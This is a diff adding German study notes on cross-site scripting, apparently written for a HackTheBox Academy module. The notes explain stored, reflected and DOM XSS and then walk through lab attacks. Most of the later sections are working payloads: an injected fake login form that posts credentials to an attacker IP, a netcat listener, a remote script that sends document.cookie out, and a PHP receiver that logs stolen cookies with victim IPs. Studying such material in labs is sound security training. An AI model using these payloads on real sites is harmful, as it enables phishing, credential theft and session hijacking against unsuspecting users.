@@ -1,0 +1,230 @@
+Cross-Site-Scripting(XSS)
+XSS Basics
+1. Intro to XSS:
+- Introduction:
+	- Web-Anwendung sind immer beliebter somit gibt es auch immer mehr Web-Anwendungs Schwachstellen
+	- Einer dieser Schwachstellen lautet Cross-Site-Scripting(XSS)
+	- XSS nutzt den User Input aus und schleusst boesen Code ein
+
+- What is XSS:
+	- Eine normale Web-Anwendung rendert HTML-Code vom Backend auf der Client-Side auf dem Browser
+	- XSS befallen die Client-Side einer Web-Anwendung nicht das Backend
+	- XSS tritt auf wenn der User-Input nicht gesaeubert wird
+
+- XSS Attacks:
+	- Alles was auf dem Browser laeuft kann anfaellig fuer XSS sein
+	- XSS fuehrt JavsScript Code auf dem Browser aus limitiert auf die Browser JS Engine
+	- XSS ist auf den Browser beschraenkt
+
+- Types of XSS:
+	- Stored (Persistent) XSS:
+		- User Input wird in einer Backend Datenbank gespeichert und wird beim anzeigen ausgefuehrt
+	- Reflected (Non-Persistent) XSS:
+		- Wird auf dem Backend Server ausgefuehrt aber nicht gespeichert
+	- DOM-bases XSS:
+		- User Input wird direkt im Browser angezeigt und vollstaendig auf der Clientside ausgefuehrt
+
+2. Stored XSS:
+- Ein Stored XSS Angriff geschieht wenn der Payload in einer Datenbank gespeichert wird und auf der Website angezeigt wird
+- Es ist der kritischte Angriff weil diese Art von Angriff alle Nutzer betreffen kann
+- XSS Testing Payloads:
+	- Wir koennen Testen ob ein Input eine XSS Schwachstelle hat
+	- <script>alert(window.origin)</script>
+	- Mit View Page Source koennen wir den Source Code der Website sehen
+	- Viele WebAnwendungen verwenden IFrames fuer den User Input
+	- Eventuell wird die JavaScript Funktion altert() nicht ausgefuehrt
+	- Wir koennen stattdessen <script>print(window.origin)</script> verwenden
+	- Um zu ueberpruefen ob der Payload gespeichert worden ist koennen wir die Website neu laden
+	- <script>alert((window.origin)+"?"+document.cookie)</script>
+
+3. Reflected XSS:
+- Ein Reflected XSS Angriff werden nicht gespeichert sondern auf dem Backend sofort ausgefuehrt
+- Error Nachrichten oder Bestätigungsnachrichten werden ueberprueft und vom Backend zum Client gesendet
+- <script>alert((window.origin)+"?"+document.cookie)</script>
+
+4. DOM XSS:
+- Ein DOM XSS Angriff wird nicht gespeichert und im Gegensatz zum Reflected XSS Angriff sofort auf der Clientside ausgefuehrt
+- Die Eingabe wird nicht an das Backend gesendet sondert sofort auf dem Frontend verarbeitet
+
+- Source & Sink:
+	- Source und Sink sind Konzept die wir fuer DOM XSS verstehen muessen
+	- Source ist das JavaScript Object welches den Userinput aufnimmt
+	- Sink ist die Funktion die den Userinput in das DOM aufnimmt wie document.write(), DOM.innerHTML, add(), append() usw
+	- Wenn eine Sink Methode die Eingabe nicht saeubert wissen wir, dass die Website fuer XSS anfaellig ist
+
+- DOM Attacks:
+	- innerHTML erlaubt <script> tags nicht deswegen muessen wir andere Tags verwenden wie <img> usw
+<img src="" onerror=alert((window.origin)+"?"+document.cookie)>
+
+5. XSS Discovery:
+- Es gibt 3 Arten von XSS Schwachstellen jetzt muessen wir nur noch wissen wie wir diese Schwachstellen entdecken
+
+- Automated Discovery:
+	- Es gibt verschiedene Webanwendungs Schwachstellen Scanner wie Nessus, Burp Pro oder ZAP
+	- Open Source XSS Scanner sind XSS Strike, Brute XSS, XSSer
+	- Diese fuehren meistens einen passiven Scan und einen aktiven Scan durch
+	- Ein passiver Scan sieht sich die potentiellen DOM Schwachstellem im Code an
+	- Ein aktiver Scan sendet Payloads an verschiedene Inputs um XSS zu triggern
+
+- Manual Discovery:
+	- Das Finden von XSS Schwachstellen kommt auf die Komplexitaet des Systems an
+	-Eine komplizierte App benoetigt einen erweiterten Code Review
+	- XSS Payloads:
+		- Es gibt online grosse Listen an XSS Payloads wie https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md oder https://github.com/payloadbox/xss-payload-list
+		- Es gibt injections Vektoren um JavaScript Code auzufuehren mit HTML Tags wie <img> oder <script>
+
+- Code Review:
+	- Der beste Weg um XSS Schwachstgellen zu finden ist manueller Code Review
+	- pyton xsstrike.py -u "http://206.189.112.129:31166/index.php?fullname=aa&username=aa&password=aa&email=aaa%40aa.de"
+
+###################################################################################################
+XSS Attacks
+1. Defacing:
+- Eine beliebter Angriff ist das Defacing bei dem das Aussehen der Website geaendert wird
+
+- Defacement Elements:
+	- Wir koennen JavaScript mittels XSS einschleussen um das Aussehen einer Website zu aendern
+	- Wir haben verschiendste Element die wir verwenden koennen:
+		- Background Color: document.body.style.background
+		- Background: document.body.background
+		- Page Title: document.title
+		- Page Text: DOM.innerHTML
+
+- Changing Background:
+	- <script>document.body.style.background = "#141d2b"</script>
+	- <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+
+- Changing Page Title:
+	- <script>document.title = 'HackTheBox Academy'</script>
+
+- Changing Page Text:
+	- Wir koennen den Text von HTML Elementen veraendern mittels
+		- document.getElementById("#toDo").innerHTML = "New Text"
+	- Wir koennen auch jQuery verwenden wenn jQuery importiert wird
+		- $("#todo").html('New Text');
+	- Hiermit koennen wir einen Text einfuegen im Body
+		- document.getElementsByTagName('body')[0].innerHTML = "New Text"
+
+2. Phishing:
+- Eine haeufige XSS Angriff ist der Phishing Angriff
+- Meistens wir das Login Form geandert, sodass die Login Informationen zum Angreifer gesendet wird
+
+- Login Form Injection:
+	- Wenn wir eine Schwachstelle identifiziert haben mit einer funktionierendem Payload koennen wir eine eigenen Login Form schreiben
+	- Um HTML Code in einer Website zu schreiben koennen wir die JavaScript Funktion document.write() verwenden
+
+- Cleaning Up:
+	- Wir koennen mit der Funktion document.getElementById().remove() Teile der Website loeschen
+
+- Credential Stealing:
+	- Wenn wir Credentials aus dem Form erhalten wollen muessen wir einen Listener auf der Angriffsbox starten
+
+
+10.129.237.12
+python xsstrike.py -u "http://10.129.237.12/phishing/index.php?url=test"
+XSStrike v3.1.5
+
+[~] Checking for DOM vulnerabilities 
+[+] WAF Status: Offline 
+[!] Testing parameter: url 
+[!] Reflections found: 1 
+[~] Analysing reflections 
+[~] Generating payloads 
+[!] Payloads generated: 3094 
+------------------------------------------------------------
+[+] Payload: '><HtmL%0aONpOINteReNter%09=%09(prompt)``> 
+[!] Efficiency: 100 
+[!] Confidence: 9 
+[?] Would you like to continue scanning? [y/N] n
+
+
+Add JS Code to Add Login Form:
+'><script>
+document.write('<h3>Please login to continue</h3><form action=http://10.10.15.187:81/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+document.getElementById('urlform').remove();
+</script><!--
+
+
+Listener oeffnen:
+sudo nc -lvnp 80
+10.129.237.12/phishing/send.php
+
+
+http://10.129.237.12/phishing/index.php?url=%27%3E%3Cscript%3E+document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.187%3A81%2F%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B+document.getElementById%28%27urlform%27%29.remove%28%29%3B+%3C%2Fscript%3E%3C%21--
+
+3. Session Hijacking:
+- Moderne Web-Anwendungen verwenden Cookies um User Sessions durch mehrere Sessions zu verwenden
+- Mit Cookies muss der Unser sich nicht immer wieder anmelden sondern ist angemeldet solange die Session zulaessig ist
+- Wenn ein Angriff ein Cookie abfaengt koennte er sich als das Opfer ausgeben
+
+- Blind XSS Detection:
+	- Eine Blind XSS Schwachstelle tritt auf wenn die Schwachstelle auf einer Seite passiert zu der wir keinen Zugang haben
+	- Blind XSS Schwachstellen treten nur auf mit Forms die fuer manche User Eingaben verarbeiten wie Admins
+	- Beispiele hierfuer konnen:
+		- Support Tickets
+		- Contact Forms
+
+- Loading a Remote Script:
+	- <script src="http://OUR_IP/script.js"></script>
+	- <script src="http://OUR_IP/username"></script>
+	- Mit IP/username ueberpruefen wir ob das Feld username eine Schwachstelle aufweist
+
+- Session Hijacking:
+	- Wenn wir ein Eingabefeld haben koennen wir mit XSS ein Session Hijacking Angriff durchfuehren
+	- Mit JavaScript werden Daten gesendet und mit einem PHP Script werden Daten empfangen
+	- Mit document.cookie koennen die Cookies aufgerufen werden
+
+Module:CROSS-SITE SCRIPTING(XSS), Session Hacking
+It does call the Script.js but it doesnt call index.php
+Target: 10.129.15.183
+Attacker: 10.10.15.187
+
+Listener:
+	sudo php -S 0.0.0.0:8080
+Payload:
+	"><script src=http://10.10.15.187:8080/script.js/></script>
+Script.js:
+	new Image().src='10.10.15.187:8080/index.php?c='+document.cookie;
+index.php:
+	<?php
+	if (isset($_GET['c'])) {
+	    $list = explode(";", $_GET['c']);
+	    foreach ($list as $key => $value) {
+	        $cookie = urldecode($value);
+	        $file = fopen("cookies.txt", "a+");
+	        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+	        fclose($file);
+	    }
+	}
+	?>
+
+GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
+
+
+Login aufrufen und Cookie eigneben und Seite neu laden:
+http://10.129.15.183/hijacking/login.php
+
+#######################################################################################################
+Skills Assessment
+1. Skills Assessment:
+Target: 10.129.172.104
+Angreifer: 10.10.15.187
+
+Blog: http://10.129.172.104/assessment/index.php
+Website Field vulenerable
+	"><script src=http://10.10.15.187:8080/script.js></script>
+
+Script.js:
+	new Image().src='http://10.10.15.187:8080/index.php?c='+document.cookie;
+index.php:
+	<?php
+	if (isset($_GET['c'])) {
+	    $list = explode(";", $_GET['c']);
+	    foreach ($list as $key => $value) {
+	        $cookie = urldecode($value);
+	        $file = fopen("cookies.txt", "a+");
+	        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+	        fclose($file);
+	    }
+	}
+	?>
